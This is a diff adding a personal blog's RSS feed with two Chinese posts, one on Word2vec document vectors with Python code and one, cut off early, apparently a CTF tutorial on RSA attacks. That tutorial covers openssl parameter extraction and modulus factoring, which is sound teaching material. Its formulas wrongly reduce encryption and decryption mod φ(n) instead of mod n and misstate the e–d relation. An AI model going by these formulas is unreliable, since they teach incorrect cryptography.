@@ -1,0 +1,2142 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Posts | HumblePoster</title>
+    <link>https://p0st3r.github.io/post/</link>
+      <atom:link href="https://p0st3r.github.io/post/index.xml" rel="self" type="application/rss+xml" />
+    <description>Posts</description>
+    <generator>Source Themes Academic (https://sourcethemes.com/academic/)</generator><language>en-us</language><copyright>2016</copyright><lastBuildDate>Thu, 09 May 2019 00:00:00 +0000</lastBuildDate>
+    <image>
+      <url>https://p0st3r.github.io/images/icon_hu0b7a4cb9992c9ac0e91bd28ffd38dd00_9727_512x512_fill_lanczos_center_2.png</url>
+      <title>Posts</title>
+      <link>https://p0st3r.github.io/post/</link>
+    </image>
+    
+    <item>
+      <title>Word2vec的文档表示方法</title>
+      <link>https://p0st3r.github.io/post/word2vec-presentation/</link>
+      <pubDate>Thu, 09 May 2019 00:00:00 +0000</pubDate>
+      <guid>https://p0st3r.github.io/post/word2vec-presentation/</guid>
+      <description>&lt;p&gt;Word2vec是一种将文本转化为词向量的算法，即将词条映射为一个定长的连续的稠密向量，由这些向量构成一个向量空间，该向量的维数可以在事前确定，一般可以为50维或100维。&lt;/p&gt;
+&lt;p&gt;例如：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Apple = [1.2,0.2,0.3,0.5]
+Pear = [0.1,0.3,0.5,1.5]
+Banana = [2.2,0.2,0.4,0.6]
+Orange = [0.6,0.1,1.0,0.2]
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;每个词被表示成一个[1,4]的向量矩阵。&lt;/p&gt;
+&lt;p&gt;在文本处理的任务中直接处理的是文当，而一个文本中包含很多词，所以需要将文本想办法用Word2vec向量表示 。这里有两种思路：&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;ol&gt;
+&lt;li&gt;直接将各个词的词向量串接起来，将整个文档表示成一个三维的向量&lt;/li&gt;
+&lt;li&gt;将文本中各个词的词向量相加求平均，由最终的平均向量代表整个文本&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;三维文档向量&#34;&gt;三维文档向量&lt;/h2&gt;
+&lt;p&gt;处理如图所示：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;2.jpg&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
+&lt;p&gt;最终将文档表示成一个[M, P, F]三维向量，其中M代表文档个数，P代表每个文档的长度，为了便于神 经网络处理会将P处理成统一 长度，F代表最大特征值，即Word2vec训练出的向量大小。&lt;/p&gt;
+&lt;p&gt;这种表示方法CNN处理效果较好。&lt;/p&gt;
+&lt;p&gt;代码实例如下：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#为了统一文本长度，设置最大文本长度，超过的截断，不足的用0.向量补齐&lt;/span&gt;
+max_document_length &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;500&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;#最大特征长度，即训练的词向量维度&lt;/span&gt;
+max_feature &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt;
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;getVecsByWord2Vec&lt;/span&gt;(model, corpus, size):
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;global&lt;/span&gt; max_document_length
+
+    all_vectors &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
+    embeddingDim &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; model&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;vector_size
+    &lt;span style=&#34;color:#75715e&#34;&gt;#0.向量，用于填充&lt;/span&gt;
+    embeddingUnknown &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;0.&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(embeddingDim)]
+    
+    &lt;span style=&#34;color:#75715e&#34;&gt;#逐句获取词向量并拼接&lt;/span&gt;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; text &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; corpus:
+        this_vector &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
+        &lt;span style=&#34;color:#75715e&#34;&gt;#切除掉最大文档长度后的词&lt;/span&gt;
+        text &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; text[:max_document_length]
+        &lt;span style=&#34;color:#75715e&#34;&gt;#逐词获取词向量并拼接&lt;/span&gt;
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i,word &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; enumerate(text):
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; word &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; model&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;wv&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;vocab:        
+                this_vector&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(model[word])
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
+                this_vector&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(embeddingUnknown)
+        
+        &lt;span style=&#34;color:#75715e&#34;&gt;#不足长度的填充至最大文档长度     &lt;/span&gt;
+        dim &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;shape(this_vector)
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; dim[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; max_document_length:    
+            pad_length &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; max_document_length&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;i&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,pad_length):
+                this_vector&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(embeddingUnknown)    
+        all_vectors&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(this_vector)
+
+    x &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;array(all_vectors)
+
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; x
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;get_feature_by_opcode_word2vec&lt;/span&gt;():
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;global&lt;/span&gt; max_document_length
+
+    x &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
+    y &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
+    
+	&lt;span style=&#34;color:#75715e&#34;&gt;# 若有三维文档向量直接加载&lt;/span&gt;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;path&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;exists(wv_data_pkl_file) &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;path&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;exists(label_pkl_file):
+        f &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open(wv_data_pkl_file, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;rb&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
+        x &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pickle&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;load(f)
+        f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;close()
+        f &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open(label_pkl_file, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;rb&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
+        y &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pickle&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;load(f)
+        f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;close()
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
+        &lt;span style=&#34;color:#75715e&#34;&gt;# 导入训练数据，自定&lt;/span&gt;
+        x, y &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; load_data_pkl_file()
+
+        cores&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;multiprocessing&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;cpu_count()
+        &lt;span style=&#34;color:#75715e&#34;&gt;#若有训练好的词向量模型则直接加载&lt;/span&gt;
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;path&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;exists(word2vec_bin):
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Find cache file &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%s&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; word2vec_bin
+            model&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;gensim&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;models&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Word2Vec&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;load(word2vec_bin)
+        &lt;span style=&#34;color:#75715e&#34;&gt;#若没有则训练再保存词向量模型&lt;/span&gt;
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
+            model&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;gensim&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;models&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Word2Vec(size&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;max_features, window&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, min_count&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, iter&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;, workers&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;cores)
+            model&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;build_vocab(x)
+            model&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;train(x, total_examples&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;model&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;corpus_count, epochs&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;model&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;iter)
+            model&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;save(word2vec_bin)
+		
+        &lt;span style=&#34;color:#75715e&#34;&gt;#循环拼接出三维文档集合向量&lt;/span&gt;
+        x &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; getVecsByWord2Vec(model, x, max_features)
+
+        f &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open(wv_data_pkl_file, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;wb&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
+        pickle&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dump(x, f)
+        f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;close()
+
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; x,y
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;平均词向量&#34;&gt;平均词向量&lt;/h2&gt;
+&lt;p&gt;直接将每个文档中所有词的词向量相加求平均 ，用一个[1,F]的二维平均向量代表改文档。再将所有文档逐个拼接得到一个[M,F]的向量来表示整个文档集合。这种表示方法计算量较小 ，MLP处理效果还好，CNN效果极差。&lt;/p&gt;
+&lt;p&gt;代码实例如下：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#最大特征长度，即训练的词向量维度&lt;/span&gt;
+max_feature &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt;
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;buildWordVector&lt;/span&gt;(model,text, size):
+    vec &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;zeros(size)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;reshape((&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, size))
+    count &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0.&lt;/span&gt;
+    &lt;span style=&#34;color:#75715e&#34;&gt;#逐词获取词向量并累加&lt;/span&gt;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; word &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; text:
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:
+            vec &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; model[word]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;reshape((&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, size))
+            count &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1.&lt;/span&gt;
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;KeyError&lt;/span&gt;:
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;continue&lt;/span&gt;
+    &lt;span style=&#34;color:#75715e&#34;&gt;#求平均向量&lt;/span&gt;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; count &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
+        vec &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; count
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; vec
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;get_feature_by_opcode_word2vec&lt;/span&gt;():
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;global&lt;/span&gt; max_document_length
+
+    x &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
+    y &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
+    
+	&lt;span style=&#34;color:#75715e&#34;&gt;# 若有三维文档向量直接加载&lt;/span&gt;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;path&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;exists(wv_data_pkl_file) &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;path&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;exists(label_pkl_file):
+        f &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open(wv_data_pkl_file, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;rb&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
+        x &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pickle&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;load(f)
+        f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;close()
+        f &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open(label_pkl_file, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;rb&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
+        y &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pickle&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;load(f)
+        f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;close()
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
+        &lt;span style=&#34;color:#75715e&#34;&gt;# 导入训练数据，自定&lt;/span&gt;
+        x, y &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; load_data_pkl_file()
+
+        cores&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;multiprocessing&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;cpu_count()
+        &lt;span style=&#34;color:#75715e&#34;&gt;#若有训练好的词向量模型则直接加载&lt;/span&gt;
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;path&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;exists(word2vec_bin):
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Find cache file &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%s&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; word2vec_bin
+            model&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;gensim&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;models&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Word2Vec&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;load(word2vec_bin)
+        &lt;span style=&#34;color:#75715e&#34;&gt;#若没有则训练再保存词向量模型&lt;/span&gt;
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
+            model&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;gensim&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;models&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Word2Vec(size&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;max_features, window&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, min_count&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, iter&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;, workers&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;cores)
+            model&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;build_vocab(x)
+            model&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;train(x, total_examples&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;model&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;corpus_count, epochs&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;model&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;iter)
+            model&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;save(word2vec_bin)
+		
+        &lt;span style=&#34;color:#75715e&#34;&gt;#循环拼接出二维文档集合向量&lt;/span&gt;
+        x&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;concatenate([buildWordVector(model,z, max_features) &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; z &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; x])
+        &lt;span style=&#34;color:#75715e&#34;&gt;#归一化&lt;/span&gt;
+		x &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; scale(x)
+        
+        f &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open(wv_data_pkl_file, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;wb&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
+        pickle&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dump(x, f)
+        f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;close()
+
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; x,y
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
+    </item>
+    
+    <item>
+      <title>CTF中RSA的常见攻击方法</title>
+      <link>https://p0st3r.github.io/post/rsa-in-ctf/</link>
+      <pubDate>Wed, 09 May 2018 00:00:00 +0000</pubDate>
+      <guid>https://p0st3r.github.io/post/rsa-in-ctf/</guid>
+      <description>&lt;p&gt;RSA基于一个简单的数论事实，两个大素数相乘十分容易，将其进行因式分解确实困难的。在量子计算机还没有成熟的今天，RSA算法凭借其良好的抵抗各种攻击的能力，在公钥密码体制中发挥着中流砥柱的作用。然而即便RSA算法目前来说是安全可靠的，但是错误的应用场景，错误的环境配置，以及错误的使用方法，都会导致RSA的算法体系出现问题，从而也派生出针对各种特定场景下的RSA攻击方法。&lt;/p&gt;
+&lt;h3 id=&#34;rsa算法描述&#34;&gt;RSA算法描述&lt;/h3&gt;
+&lt;p&gt;RSA算法涉及三个参数，n，e，d，私钥为{n，d}，公钥为{n，e}。&lt;/p&gt;
+&lt;p&gt;$n= p*q$&lt;/p&gt;
+&lt;p&gt;$φ(n)= (p-1)*(q-1)$&lt;/p&gt;
+&lt;p&gt;其中n是两个大素数p，q的乘积。&lt;/p&gt;
+&lt;p&gt;d是e模φ(n)的逆元，φ(n)是n的欧拉函数。&lt;/p&gt;
+&lt;p&gt;$e^d = 1 mod φ(n)$&lt;/p&gt;
+&lt;p&gt;c为密文，m为明文，则加密过程如下：&lt;/p&gt;
+&lt;p&gt;$c = m^e mod  φ(n)$
+$m = c^d mod φ(n)$&lt;/p&gt;
+&lt;h3 id=&#34;rsa题目类型&#34;&gt;RSA题目类型&lt;/h3&gt;
+&lt;p&gt;在CTF竞赛中，RSA理所当然处在CRYPTO中居多。而且RSA作为典型的加密算法，其出镜率可谓相当高，基本上所有比赛都会有几道RSA的题目出现。&lt;/p&gt;
+&lt;h3 id=&#34;数据处理&#34;&gt;数据处理&lt;/h3&gt;
+&lt;p&gt;在进行做题之前，我们要将数据处理成可以做题的模式。基本上来说，RSA的题目都是围绕着c，m，e，d，n，p，q这几个参数展开的，但是题目一般不会直接给这种样子的参数，而是通过别的方式给出，这里就需要我们使用一些工具或者自己手工将这些参数提取出来。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;pem文件&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;对此类文件可以直接使用openssl提取，大概使用过的方式有：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;openssl   rsautl -encrypt -in FLAG -inkey public.pem -pubin -out flag.enc
+openssl   rsa -pubin -text -modulus -in warmup -in public.pem
+&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
+&lt;li&gt;pcap文件&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;针对此类文件可以使用wireshark follow一下。这种问题一般都是写了一个交互的crypto系统，所以可能产生多轮交互。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;PPC模式&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;这种模式是上述pcap文件的交互版，会给一个端口进行一些crypto的交互，参数会在交互中给出。&lt;/p&gt;
+&lt;p&gt;第二个需要处理的就是明密文，这个方法多多，不多赘述。&lt;/p&gt;
+&lt;h2 id=&#34;模数分解&#34;&gt;模数分解&lt;/h2&gt;
+&lt;p&gt;解决RSA题目最简单，最暴力，最好使的方法就是分解模数n。如果能够将n分解成功，成功得到p，q的取值，那么可求n的欧拉函数的值。&lt;/p&gt;
+&lt;p&gt;$φ(n) = (p-1)(q-1)$
+$n = p*q$&lt;/p&gt;
+&lt;p&gt;而通过e，d与n的欧拉函数满足如下关系:&lt;/p&gt;
+&lt;p&gt;$ed = 1 mod φ(n)$&lt;/p&gt;
+&lt;p&gt;$e = d^-1 mod φ(n)$&lt;/p&gt;
+&lt;p&gt;通过欧几里得算法可以通过e与n的欧拉函数的值轻易求出d，从而计算出解密密钥。&lt;/p&gt;
+&lt;p&gt;即在知道e，p，q的情况下，可以解出d：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;egcd&lt;/span&gt;(a, b):
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; a &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
+      &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; (b, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
